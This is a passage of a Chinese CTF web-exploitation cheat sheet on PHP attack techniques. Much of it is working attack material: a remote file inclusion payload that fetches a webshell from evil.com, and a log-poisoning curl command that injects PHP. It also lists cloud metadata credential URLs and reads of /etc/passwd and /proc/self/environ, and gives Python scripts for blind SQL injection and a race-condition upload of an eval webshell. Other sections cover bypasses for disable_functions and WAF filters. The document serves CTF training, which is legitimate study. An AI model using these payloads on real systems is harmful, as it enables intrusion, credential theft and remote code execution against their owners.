// 需要curl_exec()支持gopher

// === file:// → 读文件 ===
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/config.php

// === http:// → SSRF核心 ===
// 打内网Web服务、管理后台

// === 云元数据地址 ===
// AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

// 阿里云
http://100.100.100.200/latest/meta-data/

// 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

// GCP (需要header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/

// Azure (需要header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

// === CRLF注入（SSRF中的HTTP头注入） ===
// 利用%0d%0a注入额外的HTTP头
// 或构造完整HTTP请求
```

### 4.3 文件包含漏洞

```php
// ====== 本地文件包含 (LFI) ======
include($_GET['page'] . '.php');  // 自动补.php
// 绕过:
// ?page=php://filter/convert.base64-encode/resource=flag
// → include('php://filter/.../resource=flag' . '.php')
// → 伪协议目录形式绕过

// ?page=/etc/passwd%00  → %00截断（PHP < 5.3.4）
// ?page=/etc/passwd/.   → 路径截断（某些环境）
// ?page=../../../../../etc/passwd → 目录穿越（路径深度不够可加很多../）

// ====== 远程文件包含 (RFI) ======
// 条件: allow_url_include = On
include($_GET['page']);
// ?page=http://evil.com/shell.txt
// shell.txt内容: <?php system("cat /flag");?>

// ====== 日志包含（LFI→RCE） ======
// 1. 包含Apache/Nginx访问日志 → 在User-Agent中注入<?php eval()?> → include日志文件
// 2. 包含SSH日志 → 用ssh连接注入用户名 → include /var/log/auth.log
// 3. 包含邮件日志
// 4. 包含/proc/self/environ → User-Agent注入
// 5. 包含session文件 → 通过session.upload_progress注入

// 日志包含的payload模板:
// curl -H "User-Agent: <?php system('cat /flag');?>" http://target.com/
// 然后 include('/var/log/apache2/access.log')
// 或者 include('/var/log/nginx/access.log')

// ====== /proc伪文件系统利用 ======
/proc/self/environ      # 环境变量（User-Agent在其中）
/proc/self/cmdline      # 命令行参数
/proc/self/fd/0         # 标准输入
/proc/self/fd/1         # 标准输出
/proc/self/fd/2         # 标准错误
/proc/self/fd/7         # 可能的log/socket fd
/proc/self/maps         # 内存映射
/proc/self/mem          # 内存内容
/proc/self/cwd/...      # 当前工作目录

// 包含/proc的技巧:
include('/proc/self/root/proc/self/environ');  // 穿透chroot
```

### 4.4 变量覆盖漏洞

```php
// 常见变量覆盖函数
extract($_GET);       // 最经典的变量覆盖入口
extract($_POST);
parse_str($query_string);
parse_str($_GET['data']);  // 无第二个参数直接注册
import_request_variables('GP');  // PHP < 5.4

// ====== $$ 变量覆盖 ======
foreach($_GET as $k => $v) {
    $$k = $v;
}
// ?GLOBALS[flag]=123 → 可能覆盖全局变量

// ====== register_globals = on ======
// 老版本PHP独有，GET/POST参数自动注册为全局变量
// ?is_admin=1 → $is_admin = 1
// 已从PHP 5.4起移除

// ====== 绕过$$变量覆盖的常见校验 ======
// 题目: if($key != 'flag') { $$key = $value; }
// 绕过: ?key=Flag&value=xxx (大小写绕过)
//        ?key[0]=flag&value=xxx (数组绕过)
```

### 4.5 伪随机数预测

```php
// PHP的rand()和mt_rand()在种子已知时完全可预测
// 如果题目中使用了可猜测的种子
// 如 mt_srand(time()) → 可以预测所有后续mt_rand()的输出

// 攻击工具: php_mt_seed
// https://www.openwall.com/php_mt_seed/

// 场景: 题目生成随机token = mt_rand()
// → 如果种子是time() → 爆破最近几秒的种子 → 破解所有token

// 绕过: 使用 random_int() （PHP 7+, 真正的加密安全随机数）
```

### 4.6 无参 RCE

```php
// ====== 无参函数RCE场景 ======
// 题目: eval("echo 'Hello '. " . $input . ";");
// $input 只能由无参函数组成，如 a(b(c()))
// 过滤: /[^\W]+\((?R)?\)/

// 利用技巧:

// 1. getallheaders() → 获取所有HTTP头
//    current(getallheaders()) → 取第一个头
//    eval(current(getallheaders()));
//    → 在第一个HTTP头中写入PHP代码

// 2. get_defined_vars() → 获取所有已定义变量
//    array_pop(get_defined_vars()) → 最后一个变量（可能是_GET或_POST）
//    → 其中的值可控

// 3. session_id(session_start()) → 获取session_id
//    hex2bin(session_id(session_start())) → hex解码
//    eval(hex2bin(session_id(session_start())))
//    → Cookie PHPSESSID设为hex编码的PHP代码

// 4. localeconv() → 返回本地化信息
//    current(localeconv()) → 当前区域设置的小数点(通常是.)
//    scandir(current(localeconv())) → scandir('.') 列出当前目录
//    array_reverse → 反转
//    next → 取下一个元素(通常是flag文件)
//    show_source(next(array_reverse(scandir(current(localeconv())))))
//    → 读取并显示flag文件内容

// 5. 利用dir类
//    new DirectoryIterator('glob://*')
//    遍历文件

// 6. phpversion()或其他返回有用字符串的内置函数
```

### 4.7 正则回溯绕过

```php
// ====== PCRE回溯限制绕过 ======
// PHP的preg_match有回溯次数限制: pcre.backtrack_limit = 1000000（默认）

// 场景:
if(preg_match('/union|select|from/i', $input)) {
    die('Attack detected!');
}

// 绕过: 构造超长字符串耗尽回溯次数
// $input = 'union' + '/*' + 'a'*1000000 + '*/ select ...'
// preg_match尝试匹配100万次 → 到达backtrack_limit
// → 返回false（不是0也不是1）← 关键！false !== 0
// → if(preg_match(...))  → false被当作假 → 绕过

// 自动化脚本:
import requests
payload = '/*' + 'a' * 1000000 + '*/ union select 1,2,3'
r = requests.get('http://target.com/?id=' + payload)
// PHP需要处理这个100万字符的输入
// preg_match回溯超限 → 绕过

// 注意: PHP 7.3+ 中pcre.jit可能改变行为
```

### 4.8 序列化逃生（fast destruct）

```php
// ====== 绕过__wakeup之后利用__destruct的变体 ======

// 如果序列化字符串在__wakeup之前就出错
// → 后续属性不会被还原，但已还原的属性仍会触发__destruct

// 构造方式:
// 在序列化字符串中制造非法字符或截断
// 使反序列化中途失败 → 但部分对象已创建
// → PHP仍会销毁这些对象 → 触发__destruct()
// → 达到"部分执行"的效果
```

---

## 第五章：CTF 加密/编码类

### 5.1 常见编码绕过

```php
// ====== Base64家族的变种 ======
base64_encode / base64_decode        // 标准Base64
// Base64变种表:
// URL安全Base64: -_ 替代 +/
// 自定义Base64表: 替换字符映射顺序
// base32/base16/base85/base91/base92/...

// ====== 进制转换技巧 ======
// 10进制 → 8进制 → 16进制 → 字符

// PHP中执行命令的新颖方式:
// chr()拼接
// eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)...
// → eval("system(...)")

// 利用字符串自增
// $a = 'a'; ++$a → 'b'
// 通过++操作构造出需要的字符串

// ====== XOR/异或绕过 ======
// PHP字符串可以用异或操作
// echo "`{{{" ^ "?<>/";  → 输出 "_GET"
// 利用: 构造异或来绕过敏感字符检测

// ====== 取反绕过 ======
// ~ 运算符
// echo ~"\x8f\x97\x8f\x96\x91\x99\x90";  → "system"
// 利用取反构造任意字符串

// ====== 自增绕过 ======
// PHP中字符可以自增
// $a = 'a'; echo ++$a;  → 'b'
// 可以用此特性构造任意字符串（除数字外）
```

### 5.2 哈希长度扩展攻击

    哈希长度扩展攻击 (Hash Length Extension Attack):
    适用: MD5, SHA1, SHA256, SHA512 (所有Merkle-Damgård结构的哈希)

    场景:
    $secret = "random_secret_string";
    $hash = md5($secret . $user_data);
    // 用户知道$user_data和$hash
    // 但不知道$secret

    攻击:
    1. 知道 md5(secret + known_data) 的值
    2. 可以计算出 md5(secret + known_data + padding + append_data) 的值
    3. 无需知道secret

    CTF中:
    sign = md5(secret . "user=guest&role=user")
    → 不知道secret，但可以算出
    sign = md5(secret . "user=guest&role=user" + padding + "&role=admin")

    工具: hash_extender / hashpump
    python hashpump.py -s <known_hash> -d <known_data> -a <append_data> -k <key_len>

### 5.3 CBC 比特翻转攻击

```python
# CBC字节翻转攻击 (CBC Bit Flipping Attack)
# 适用: AES-CBC、DES-CBC等
# CTF常见场景:
# - 修改加密后的用户名/角色
# - 绕过加密数据的完整性校验

"""
原理:
CBC解密: plaintext[i] = decrypt(ciphertext[i]) XOR ciphertext[i-1]
如果你控制了ciphertext[i-1]，就可以控制plaintext[i]的相应位！

攻击:
如果你想将plaintext中 "user=guest" 改为 "user=admin"
需要让 ciphertext前一个块中的字节A ⊕ decrypt(具体字节) = 'a'
实际: ciphertext前一个块中的字节A' ⊕ decrypt(具体字节) = 'g'

所以需要A = A' ⊕ 'g' ⊕ 'a'
即对密文的前一个块进行XOR操作:

new_ciphertext[i-1][byte] = old_ciphertext[i-1][byte] ^ 'g' ^ 'a'

然后整个密文解密后的明文就会变成 "user=admin"
"""
```

---

## 第六章：CTF 工具速查

### 6.1 随用随取的脚本片段

```python
# ====== 二分法布尔盲注 ======
import requests
url = "http://target.com/?id=1"

def check(payload):
    return "Welcome" in requests.get(url + payload).text

result = ""
for pos in range(1, 33):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND ascii(substr((SELECT database()),{pos},1))>{mid}--+"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    if low == 32: break
    result += chr(low)
    print(result)

# ====== 时间盲注 ======
import requests, time
url = "http://target.com/?id=1"
result = ""
for pos in range(1, 33):
    for c in range(32, 127):
        payload = f"' AND if(ascii(substr(database(),{pos},1))={c},sleep(2),0)--+"
        start = time.time()
        try: requests.get(url + payload, timeout=5)
        except: pass
        if time.time() - start > 1.5:
            result += chr(c)
            print(result)
            break

# ====== 条件竞争上传 ======
import requests, threading

def upload():
    while True:
        files = {'file': ('shell.php', '<?php @eval($_POST[1]);?>')}
        requests.post('http://target.com/upload', files=files)

def access():
    while True:
        r = requests.get('http://target.com/uploads/shell.php')
        if r.status_code == 200:
            print('[+] Got it!')
            break

threading.Thread(target=upload).start()
threading.Thread(target=access).start()

# ====== PHP反序列化payload生成 ======
import requests, base64, pickle

# 简单的PHP序列化payload生成
def php_serialize(obj):
    """手动构造PHP序列化字符串"""
    pass

# 示例: 生成简单的反序列化payload
# O:7:"Exploit":1:{s:3:"cmd";s:10:"phpinfo();";}

# ====== Gopherus自动生成SSRF Payload ======
# pip install gopherus
# 然后在命令行:
# gopherus --exploit redis
# gopherus --exploit mysql
# gopherus --exploit fastcgi
```

### 6.2 SQL 注入快速判断

```sql
-- ====== 一秒钟判断注入点 ======
-- 数字型
?id=1 and 1=1    # 正常
?id=1 and 1=2    # 异常 → 数字型注入

-- 字符型
?id=1' and '1'='1    # 正常
?id=1' and '1'='2    # 异常 → 字符型注入

-- 搜索型
?keyword=admin%' and 1=1 and '%'='   # 正常
?keyword=admin%' and 1=2 and '%'='   # 异常 → 搜索型注入

-- 判断数据库类型
-- MySQL: /*!50000*/ 和 # 注释有效
-- MSSQL: waitfor delay '0:0:5' 延时
-- Oracle: from dual 必须
-- PostgreSQL: pg_sleep(5) 和 || 字符串拼接
-- SQLite: sqlite_version() 返回版本

-- 判断字段数
order by N  -- N递增直到报错

-- 查看数据库（各个数据库不同）
-- MySQL: SELECT database()
-- MSSQL: SELECT DB_NAME()
-- Oracle: SELECT user FROM dual (无单独的database概念)
-- PostgreSQL: SELECT current_database()
-- SQLite: 无(单文件数据库)，用sqlite_master查表
```

---

## 第七章：CTF 综合套路总结

### 7.1 白盒审计题目出现模式

    白盒审计高频危险点:

    1. unserialize($_GET['data'])
       → 反序列化漏洞，构造POP链

    2. include($file)
       → 文件包含，伪协议走起

    3. system("ping $ip")
       → 命令注入

    4. $sql = "SELECT ... WHERE id = $id"
       → SQL注入，数字型更直接

    5. file_get_contents($url)
       → SSRF → gopher打Redis → getshell

    6. preg_replace('/pattern/e', ...)
       → /e修饰符 → 代码执行

    7. extract($_GET) / parse_str($_GET['data'])
       → 变量覆盖

    8. create_function('$a', $_GET['code'])
       → 代码注入 (闭合花括号)

    9. assert($_GET['code'])
       → 代码执行 (PHP < 7.2)

    10. call_user_func($_GET['func'], $_GET['arg'])
       → 动态调用 → 任意函数执行

### 7.2 CTF 解题路径速查

    Web CTF解题标准路径:

    Step 1: 快速侦查
    ├── 查看页面源码（注释/隐藏信息）
    ├── robots.txt / .git/HEAD / .DS_Store
    ├── HTTP响应头 (Server/X-Powered-By/Cookie)
    └── favicon.ico hash → Shodan搜指纹

    Step 2: 目录/文件发现
    ├── dirsearch/ffuf扫目录
    ├── 常用: /.git/, /.svn/, /robots.txt, /flag, /backup
    ├── 源码泄露: .php.bak, .php~, .php.old, .swp
    └── 配置文件: .env, .git/config, web.config

    Step 3: 确认技术栈
    ├── PHP版本 (phpinfo / 报错信息 / X-Powered-By)
    ├── 框架 (ThinkPHP/Laravel特殊路由)
    ├── CMS (WordPress/Drupal/Joomla特征路径)
    └── 中间件（Tomcat/WebLogic/Nginx/Apache版本）

    Step 4: 攻击面测绘
    ├── 登录框 → SQL注入/弱口令
    ├── 搜索框 → SQL注入/XSS
    ├── 上传点 → 文件上传
    ├── 回显数据的页面 → UNION注入
    ├── 报错页面 → 报错注入
    ├── URL含参数 → GET注入
    └── 文件读取/下载功能 → LFI/SSRF

    Step 5: 漏洞确认利用
    └── 使用相应工具和payload执行

    Step 6: Flag提取
    ├── 读文件 (flag.txt/flag.php)
    ├── 查数据库 (flag表)
    ├── 环境变量 (env/getenv)
    ├── 命令执行 (cat /flag)
    └── 备注: flag可能在/flag, /flag.txt, /var/www/html/flag.php, 根目录...

### 7.3 PHP 危险函数禁用绕过

```php
// CTF中经常遇到disable_functions限制了system/exec等
// 以下是绕过方法:

// 1. 利用未禁用的函数
// 如果passthru没被禁 → 直接用
// 如果proc_open没被禁 → 更复杂但能用
// 如果mail没被禁 → 利用第五个参数

// 2. LD_PRELOAD绕过
// 利用mail() → 触发sendmail → LD_PRELOAD加载恶意.so
// 恶意.so中的__attribute__((constructor))在库加载时自动执行
// 工具: https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

// 3. PHP-FPM未授权访问
// 如果PHP-FPM监听9000端口且未限制
// → Gopher打FastCGI → 设置PHP_VALUE更改disable_functions

// 4. FFI (PHP 7.4+)
// 如果FFI可用:
// $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
// $ffi->system("cat /flag");

// 5. COM组件 (Windows)
// new COM("WScript.Shell") → Run

// 6. imap_open() 绕过
// imap_open('{evil.com:993/imap/ssl}INBOX', '', '');
// 配合ssrf利用

// 7. Ghostscript
// ImageMagick处理图片可能调用Ghostscript
// → CVE漏洞利用 → RCE

// 8. PHP 7.x GC UAF
// 利用PHP垃圾回收机制的UAF漏洞
// → 修改内存 → 代码执行
// 复杂的exploit：https://github.com/mm0r1/exploits
```

### 7.4 CVE 速查（CTF 常见）

    Web类常见CVE:
    CVE-2017-11882     # Office公式编辑器RCE
    CVE-2021-44228     # Log4j JNDI注入
    CVE-2022-22965     # Spring4Shell
    CVE-2022-22947     # Spring Cloud Gateway RCE
    CVE-2021-40444     # MSHTML RCE
    CVE-2022-30190     # Follina MSDT RCE
    CVE-2019-2725      # WebLogic反序列化
    CVE-2020-14882     # WebLogic Console RCE
    CVE-2021-26084     # Confluence OGNL注入
    CVE-2022-26134     # Confluence OGNL注入
    CVE-2021-41773     # Apache 路径穿越
    CVE-2021-42013     # Apache 路径穿越(41773补丁绕过)
    CVE-2023-50164     # Struts2文件上传RCE
    CVE-2019-9670      # Zimbra XXE
    CVE-2018-7600      # Drupalgeddon2 (Drupal RCE)
    CVE-2019-6340      # Drupal REST RCE
    CVE-2020-1938      # Tomcat AJP幽灵猫
    CVE-2017-12615     # Tomcat PUT方法上传
    CVE-2019-0230      # Struts2 S2-059
    CVE-2023-32784     # KeePass密码管理器主密码dump
    CVE-2024-21762     # FortiOS 越界写RCE

    反序列化利用链:
    CommonsCollections 1-7
    CommonsBeanutils
    Spring AOP
    Jdk7u21
    Hibernate
    Fastjson/Jackson
    Shiro RememberMe

    框架:
    ThinkPHP 5.x RCE
    Laravel Debug模式RCE
    Yii 2 反序列化

---

## 附录：CTF 速查卡片

### A. SQL 注入函数卡片

    联合查询: UNION SELECT, ORDER BY, GROUP_CONCAT
    报错注入: extractvalue, updatexml, floor+rand+group by
    布尔盲注: substr, ascii, length, if, left, right
    时间盲注: sleep, benchmark, if+sleep, 笛卡尔积
    读文件:   LOAD_FILE, select ... into outfile
    写文件:   INTO OUTFILE, INTO DUMPFILE
    信息搜集: VERSION(), DATABASE(), USER(), @@datadir

### B. PHP 危险函数卡片

    命令执行: system, exec, shell_exec, passthru, popen, proc_open, 反引号, pcntl_exec
    代码执行: eval, assert, preg_replace(/e), create_function, call_user_func
    文件包含: include, require, include_once, require_once
    文件操作: file_get_contents, file_put_contents, fwrite, move_uploaded_file
    反序列化: unserialize (所有phar://文件操作函数也触发反序列化)
    变量覆盖: extract, parse_str, import_request_variables, $$, register_globals

### C. 伪协议速查卡片

    读源码:   php://filter/convert.base64-encode/resource=
    文件包含: php://input (POST body作为PHP执行)
    内联代码: data://text/plain,<?php phpinfo();?>
              data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
    读文件:   file:///etc/passwd
    反序列化: phar://uploaded.jpg
    压缩包:   zip://file.zip%23shell.php
              compress.bzip2://file.bz2

### D. 绕过速查卡片

    空格绕过: /**/, %09, %0a, %0d, %0c, (), +, `` (反引号)
    逗号绕过: FROM x FOR y, JOIN, LIMIT 1 OFFSET 2
    等号绕过: LIKE, REGEXP, BETWEEN, IN, <>, >, <
    引号绕过: 十六进制(0x...), CHAR(), 宽字节(%df')
    关键词:  大小写, 双写, 内联注释/*!*/, 注释分隔
    WAF:     PCRE回溯超限, 分块传输, 参数污染, HTTP走私

---

> **CTF 法则**: 遇到不会的题，先看是什么语言/框架/函数，然后从本文的索引中找到对应的利用方式。CTF 没有真正的"零解"题，只是你还没找到正确的那个函数或绕过方式。
